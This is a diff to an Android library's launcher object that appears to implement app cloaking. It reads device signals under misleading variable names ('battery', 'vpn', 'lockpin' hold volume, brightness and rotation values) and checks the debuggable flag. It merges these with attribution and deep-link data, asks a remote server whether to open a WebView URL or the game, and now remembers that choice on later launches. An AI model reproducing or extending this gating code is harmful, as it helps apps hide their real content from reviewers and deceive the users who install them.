@@ -17,6 +17,9 @@ import com.onesignal.OneSignal
 import com.trident.library.Utils.createRepoInstance
 import com.trident.library.callbacks.BackObjectCallback
 import com.trident.library.constants.Constants.ONESIGNAL_ID
+import com.trident.library.constants.Constants.ON_GAME_LAUNCHED
+import com.trident.library.constants.Constants.ON_WEB_LAUNCHED
+import com.trident.library.constants.Constants.TRUE
 import com.trident.library.constants.Constants.adId
 import com.trident.library.constants.Constants.ad_id_key
 import com.trident.library.constants.Constants.adb
@@ -58,6 +61,7 @@ import com.trident.library.constants.Constants.model
 import com.trident.library.constants.Constants.model_key
 import com.trident.library.constants.Constants.origCost
 import com.trident.library.constants.Constants.orig_cost_key
+import com.trident.library.constants.Constants.preferences
 import com.trident.library.constants.Constants.repository
 import com.trident.library.constants.Constants.secure_get_parametr
 import com.trident.library.constants.Constants.secure_key
@@ -87,34 +91,56 @@ object BackObject {
 
         backObjectCallback = activity as BackObjectCallback
 
-        //create repo instance
-        createRepoInstance(activity.applicationContext)
+        if (preferences.getOnGameLaunched(name = ON_GAME_LAUNCHED) == TRUE) {
 
-        //assigning vars from app context strings
-        assignVars(activity)
+            backObjectCallback.startGame()
+            activity.finish()
 
-        //initializing one signal
-        initOnesignal(activity.applicationContext)
+        } else if (preferences.getOnWebLaunched(name = ON_WEB_LAUNCHED) == TRUE) {
 
-        //assigning ad_id
-        assignAdvertiserId(activity.applicationContext)
+            activity.lifecycleScope.launch(Dispatchers.IO) {
+                //starting web activity
+                activity.startActivity(
+                    Intent(activity, WebActivity::class.java)
+                        .putExtra("url", createRepoInstance(activity).linkDao.getAllData().component1().link))
 
-        //setting local data params
-        setLocalData(activity)
+                activity.finish()
+            }
 
-        //observing live datas
-        observeLiveData(activity)
 
-        //apps data in coroutine
-        activity.lifecycleScope.launch(Dispatchers.IO) {
-            getAppsData(appsflyerId, activity)
+        } else {
+
+            //create repo instance
+            // createRepoInstance(activity.applicationContext)
+
+            //assigning vars from app context strings
+            assignVars(activity)
+
+            //initializing one signal
+            initOnesignal(activity.applicationContext)
+
+            //assigning ad_id
+            assignAdvertiserId(activity.applicationContext)
+
+            //setting local data params
+            setLocalData(activity)
+
+            //observing live datas
+            observeLiveData(activity)
+
+            //apps data in coroutine
+            activity.lifecycleScope.launch(Dispatchers.IO) {
+                getAppsData(appsflyerId, activity)
+            }
+
+
+            //facebook deep link in coroutine
+            activity.lifecycleScope.launch(Dispatchers.IO) {
+                fetchDeepLink(activity)
+            }
+
         }
 
-
-        //facebook deep link in coroutine
-        activity.lifecycleScope.launch(Dispatchers.IO) {
-            fetchDeepLink(activity)
-        }
 
     }
 
@@ -165,16 +191,26 @@ object BackObject {
     //get local data from phone and set to vars
     private fun setLocalData(context: Context) {
 
-        val audioManager: AudioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
+        val audioManager: AudioManager =
+            context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
 
         devTmz = TimeZone.getDefault().id
         adb = 0 != context.applicationInfo.flags and ApplicationInfo.FLAG_DEBUGGABLE
         battery = audioManager.getStreamVolume(AudioManager.STREAM_ALARM).toString()
         model = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC).toString()
         manufacture = audioManager.getStreamVolume(AudioManager.STREAM_NOTIFICATION).toString()
-        vpn = (Settings.System.getInt(context.contentResolver, Settings.System.SCREEN_BRIGHTNESS) / 21).toString()
-        autoZone = Settings.Global.getString(context.contentResolver, Settings.Global.AIRPLANE_MODE_ON) != "0"
-        lockpin = Settings.System.getInt(context.contentResolver, Settings.System.ACCELEROMETER_ROTATION) == 1
+        vpn = (Settings.System.getInt(
+            context.contentResolver,
+            Settings.System.SCREEN_BRIGHTNESS
+        ) / 21).toString()
+        autoZone = Settings.Global.getString(
+            context.contentResolver,
+            Settings.Global.AIRPLANE_MODE_ON
+        ) != "0"
+        lockpin = Settings.System.getInt(
+            context.contentResolver,
+            Settings.System.ACCELEROMETER_ROTATION
+        ) == 1
 
 
         //logs data
@@ -225,7 +261,6 @@ object BackObject {
         Log.d("library", "6. Started network request  (next - response)")
 
 
-
         var netRequest = Common.retrofitService
         netRequest.checkStatus(finalUrl).enqueue(object : Callback<ResponseBody> {
 
@@ -234,14 +269,16 @@ object BackObject {
                 //logs data
                 Log.d("library", "7. Response code - ${response.code()} (next - passing url to webview)")
 
-                activity.lifecycleScope.launch(Dispatchers.IO){
+                activity.lifecycleScope.launch(Dispatchers.IO) {
                     //creating repo instance
-                    Utils.createRepoInstance(activity).linkDao.addLink(Link(1, finalUrl))
+                    createRepoInstance(activity).linkDao.addLink(Link(1, finalUrl))
                     //starting activity
-                    activity.startActivity(Intent(activity, WebActivity::class.java))
+                    activity.startActivity(
+                        Intent(activity, WebActivity::class.java)
+                            .putExtra("url", createRepoInstance(activity).linkDao.getAllData().component1().link))
+                    activity.finish()
 
                 }
-
 
 
             }
@@ -254,6 +291,8 @@ object BackObject {
 
                 //sending callback to apps main activity
                 backObjectCallback.startGame()
+
+                activity.finish()
 
             }
         })
@@ -363,14 +402,14 @@ object BackObject {
     }
 
     //observing livedata with information
-    private fun observeLiveData(activity: AppCompatActivity){
+    private fun observeLiveData(activity: AppCompatActivity) {
 
-        appsLiveData.observe(activity){
+        appsLiveData.observe(activity) {
             //logs data
             Log.d("library", "5. Apps data got  (next - facebook depp link data get)")
             appsCheck = true
 
-            if(appsCheck && deepCheck) {
+            if (appsCheck && deepCheck) {
                 //logs data
                 Log.d("library", "$appsCheck - apps check, $deepCheck - deep check (apps observer)")
                 makeNetworkRequest(activity)
@@ -379,12 +418,12 @@ object BackObject {
 
         }
 
-        deepLinkLiveData.observe(activity){
+        deepLinkLiveData.observe(activity) {
             //logs data
             Log.d("library", "5. Deep link data got  (next - appsflyer data get)")
             deepCheck = true
 
-            if(appsCheck && deepCheck) {
+            if (appsCheck && deepCheck) {
                 //logs data
                 Log.d("library", "$appsCheck - apps check, $deepCheck - deep check (deep observer)")
                 makeNetworkRequest(activity)
@@ -395,7 +434,6 @@ object BackObject {
         //logs data
         Log.d("library", "4. Observers set  (next - observing data)")
     }
-
 
 
 }
